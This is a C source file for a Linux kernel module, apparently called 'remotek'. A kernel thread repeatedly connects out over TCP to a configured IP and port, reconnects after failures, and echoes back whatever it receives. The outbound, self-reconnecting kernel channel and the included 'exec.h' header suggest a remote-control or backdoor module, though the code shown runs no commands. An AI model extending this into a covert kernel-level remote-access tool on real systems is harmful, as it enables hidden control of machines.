#include "exec.h"
#include "globals.h"
#include "network.h"

#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/net.h>

static void *convert(void *ptr)
{
    return ptr;
}

int communicate(void *data)
{
    struct sockaddr_in addr = { 0 };
    struct msghdr msg = { 0 };
    struct msghdr rmsg = { 0 };
    struct kvec vec = { 0 };
    struct kvec rvec = { 0 };
    struct globals *global = data;
    struct socket *sock = global->sock;
    char buf[BUF_SIZE] = { 0 };
    unsigned char ip_binary[4] = { 0 };
    int ret = 0;

    if ((ret = in4_pton(global->ip, -1, ip_binary, -1, NULL)) == 0)
    {
        pr_err("remotek: error converting the IPv4 address: %d\n", ret);
        return 1;
    }

    while (kthread_should_stop() == 0)
    {

        if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0)
        {
            pr_err("remotek: error creating the socket: %d\n", ret);
            continue;
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(global->port);

        memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof (addr.sin_addr.s_addr));

        if ((ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0)) < 0)
        {
            pr_err("remotek: error connecting to %s:%d (%d)\n", global->ip, global->port, ret);
            sock_release(sock);
            sock = NULL;
            continue;
        }

        while (kthread_should_stop() == 0)
        {
            rvec.iov_base = buf;
            rvec.iov_len = BUF_SIZE - 1;

            if ((ret = kernel_recvmsg(sock, &rmsg, &rvec, 1, BUF_SIZE - 1, 0)) <= 0)
            {
                pr_warn("remotek: connection lost or closed\n");
                sock_release(sock);
                sock = NULL;
                break;
            }

            buf[ret] = '\0';
            pr_info("remotek: received: %s\n", buf);
            pr_info("remotek: sending: %s\n", buf);
            vec.iov_base = buf;
            vec.iov_len = strlen(buf);

            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending the greeting message: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                break;
            }
        }
    }
    return 0;
}
